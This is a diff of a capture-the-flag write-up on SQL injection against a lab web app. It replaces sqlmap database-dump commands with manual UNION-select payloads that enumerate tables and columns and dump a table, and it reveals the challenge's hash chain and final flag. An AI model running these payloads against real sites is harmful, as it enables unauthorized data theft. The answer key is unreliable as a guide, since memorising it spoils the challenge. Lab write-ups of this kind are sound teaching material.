@@ -8,19 +8,19 @@ Go to ?page=searchimg.
 In the search field, search `1 AND 1=1`
 
 ## How to exploit
-fast:
-sqlmap -u "http://192.168.1.75/index.php?page=member&id=5&Submit=Submit#" --dump -D Member_images --tables -T list_images
-slow:
-sqlmap -u "http://192.168.1.75/?page=searchimg&id=1&Submit=Submit#" --dump -T list_images
--u=url
--D=Database
--T=Table
 
-If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46 
+In the search field, run `-1 union select null, concat (table_name) from information_schema.tables where table_schema = database ()`  
+This will return a table name.  
+Then, in the same search field, run `-1 union select null, concat (column_name) from information_schema.columns where table_schema = database ()`  
+This will return the column names.  
+Lastly, in the search field, run `-1 union select NULL, concat (id, url, title, comment) from list_images`  
+This will return the images from the table, with one of the entries being:
 
-MD5(1928e8083cf461a51303633093573c46)
-sha256(albatroz)
-F2A29020EF3132E01DD61DF97FD33EC8D7FCD1388CC9601E7DB691D17D4D6188
+```If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46 ```  
+
+MD5 decrypt: `1928e8083cf461a51303633093573c46`  
+Follwed by sha256: `albatroz`  
+Flag: `F2A29020EF3132E01DD61DF97FD33EC8D7FCD1388CC9601E7DB691D17D4D6188`
 
 ## Solution
 
